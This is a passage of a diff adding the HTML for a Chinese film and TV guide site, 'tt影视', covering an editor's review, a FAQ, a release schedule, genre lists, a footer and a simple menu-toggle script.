+            <p>最值得称道的是声音设计。北方边境的小城，冬季风声有固定的频率区间，影片用这个声音作为转场依据，比任何字幕说明都更有效。表演方面，配角群像的完成度高于主角线，这在同类题材中并不常见。</p>
+            <p>不剧透地说，结局处理方式会明显分流观众评价，这恰好是它值得被讨论的原因。</p>
+          </div>
+          <aside class="pick-side">
+            <h4>观看门槛清单</h4>
+            <ul>
+              <li><b>时长</b><span>168 分钟，建议留整段时间</span></li>
+              <li><b>题材</b><span>历史剧情，含战争场面</span></li>
+              <li><b>节奏</b><span>前半段偏慢，需要耐心</span></li>
+              <li><b>字幕</b><span>含方言段落，注意字幕版本</span></li>
+              <li><b>适合</b><span>喜欢叙事结构的观众</span></li>
+            </ul>
+          </aside>
+        </div>
+      </section>
+
+      <!-- 08 FAQ -->
+      <section class="sec" id="faq">
+        <div class="sec-head">
+          <span class="sec-no">08</span>
+          <h2 class="sec-title">常见<em>问题</em></h2>
+          <span class="sec-sub">点击展开答案</span>
+        </div>
+        <div class="faq">
+          <details class="faq-item" open>
+            <summary class="faq-q">tt影视 是什么类型的网站？</summary>
+            <div class="faq-a">tt影视是一个影视内容导航与观影参考平台，提供新片档期、剧集榜单、综艺与番剧更新、热度排行和编辑选片长评。官方地址为 <a href="https://ttyingshi-top.github.io" target="_blank" rel="noopener">ttyingshi-top.github.io</a>，全站内容由编辑团队整理更新。</div>
+          </details>
+          <details class="faq-item">
+            <summary class="faq-q">榜单数据多久更新一次？</summary>
+            <div class="faq-a">热度榜 TOP10 每小时刷新一次，口碑榜每日重排，院线片单每周更新一次。榜单数据来自各平台公开指数，仅供参考。</div>
+          </details>
+          <details class="faq-item">
+            <summary class="faq-q">手机上浏览会有排版问题吗？</summary>
+            <div class="faq-a">不会。全站采用响应式设计，在 320px 到 2560px 宽度范围内均可正常浏览，导航在窄屏下自动折叠为菜单按钮，表格支持横向滑动。</div>
+          </details>
+          <details class="faq-item">
+            <summary class="faq-q">如何快速找到正在热播的剧？</summary>
+            <div class="faq-a">点击顶部导航的「热播剧集」可直达口碑榜，每部剧标注了当前更新集数与评分，可直接判断是否值得追。</div>
+          </details>
+          <details class="faq-item">
+            <summary class="faq-q">动漫番剧板块包含哪些内容？</summary>
+            <div class="faq-a">包含国产原创动画、日本新番、完结佳作与长篇连载，每部标注更新进度，方便判断能否一次追完。</div>
+          </details>
+          <details class="faq-item">
+            <summary class="faq-q">编辑选片的长评多久更新？</summary>
+            <div class="faq-a">每周一更新一篇，每篇只选一部作品做深度分析，并附观看门槛清单，包括时长、题材、节奏与适合的观众类型。</div>
+          </details>
+          <details class="faq-item">
+            <summary class="faq-q">档期信息会提前多久公布？</summary>
+            <div class="faq-a">院线片单通常提前一至两周更新，具体上映日期以发行方最终公布为准，我们会同步修正。</div>
+          </details>
+          <details class="faq-item">
+            <summary class="faq-q">评分出现分歧时以哪个为准？</summary>
+            <div class="faq-a">页面标注的评分以主流评分平台公开数据为准，同时我们会附上编辑主观评价，两者分开呈现，不做加权处理。</div>
+          </details>
+          <details class="faq-item">
+            <summary class="faq-q">发现信息有误如何反馈？</summary>
+            <div class="faq-a">可在页面底部通过官方站点入口提交反馈，编辑会在两个工作日内核实并修正相关内容。</div>
+          </details>
+        </div>
+      </section>
+
+    </div>
+
+    <!-- 边栏 -->
+    <aside class="aside">
+      <div class="widget">
+        <h4>本周档期速记</h4>
+        <ul class="schedule">
+          <li><span class="dy">10.18</span><span>《沉默的灯塔》全国公映，密钥期 30 天</span></li>
+          <li><span class="dy">10.21</span><span>《漫长的告别》收官，全 24 集一次放出</span></li>
+          <li><span class="dy">10.25</span><span>《深海回声》IMAX 与 2D 同步上映</span></li>
+          <li><span class="dy">10.28</span><span>《十二道风味》第 12 期上线，主题西南山野</span></li>
+          <li><span class="dy">11.01</span><span>《荒野牧歌》定档，威尼斯入围片</span></li>
+        </ul>
+      </div>
+      <div class="widget">
+        <h4>按题材浏览</h4>
+        <ul class="genre">
+          <li><span>悬疑犯罪</span><span>12 部</span></li>
+          <li><span>历史剧情</span><span>8 部</span></li>
+          <li><span>科幻视效</span><span>5 部</span></li>
+          <li><span>都市情感</span><span>9 部</span></li>
+          <li><span>动画番剧</span><span>14 部</span></li>
+          <li><span>综艺纪录</span><span>11 部</span></li>
+        </ul>
+      </div>
+      <div class="widget">
+        <h4>官方入口</h4>
+        <p style="font-size:13.5px;color:var(--ink-2)">收藏本站官方地址，随时查看最新片单与榜单：</p>
+        <p style="margin-top:12px;font-size:14px;font-weight:800;color:var(--accent);word-break:break-all">ttyingshi-top.github.io</p>
+        <p style="margin-top:10px;font-size:12.5px;color:var(--ink-2)">全站免费浏览，无需注册，支持手机与电脑自适应。</p>
+      </div>
+    </aside>
+
+  </div>
+</main>
+
+<footer>
+  <div class="container">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <span class="logo">tt影视</span>
+        <p>tt影视（ttyingshi-top.github.io）是独立运营的影视内容导航平台，专注新片档期、剧集口碑、综艺番剧与热度排行，帮助观众快速做出观看决策。</p>
+      </div>
+      <div>
+        <h5>内容板块</h5>
+        <ul>
+          <li><a href="#movie">院线大片</a></li>
+          <li><a href="#tv">热播剧集</a></li>
+          <li><a href="#show">综艺纪录</a></li>
+          <li><a href="#anime">动漫番剧</a></li>
+          <li><a href="#rank">热度榜单</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>编辑内容</h5>
+        <ul>
+          <li><a href="#news">影视资讯</a></li>
+          <li><a href="#pick">编辑选片</a></li>
+          <li><a href="#faq">常见问题</a></li>
+          <li><a href="https://ttyingshi-top.github.io" target="_blank" rel="noopener">官方站点</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>关于本站</h5>
+        <ul>
+          <li>更新频率：每日</li>
+          <li>榜单口径：公开指数</li>
+          <li>内容类型：参考导航</li>
+          <li>适配设备：手机 / 电脑</li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-bot">
+      <span>© 2026 tt影视 · ttyingshi-top.github.io · 保留所有权利</span>
+      <span>内容仅供观影参考，具体以各平台实际排播为准</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var btn=document.getElementById('tNav'),nav=document.getElementById('nav');
+  btn.addEventListener('click',function(){
+    var open=nav.classList.toggle('on');
+    btn.classList.toggle('on',open);
+    btn.setAttribute('aria-expanded',open?'true':'false');
+  });
+  nav.addEventListener('click',function(e){
+    if(e.target.tagName==='A'){
+      nav.classList.remove('on');
+      btn.classList.remove('on');
+      btn.setAttribute('aria-expanded','false');
+    }
+  });
+})();
+</script>
+</body>
+</html>
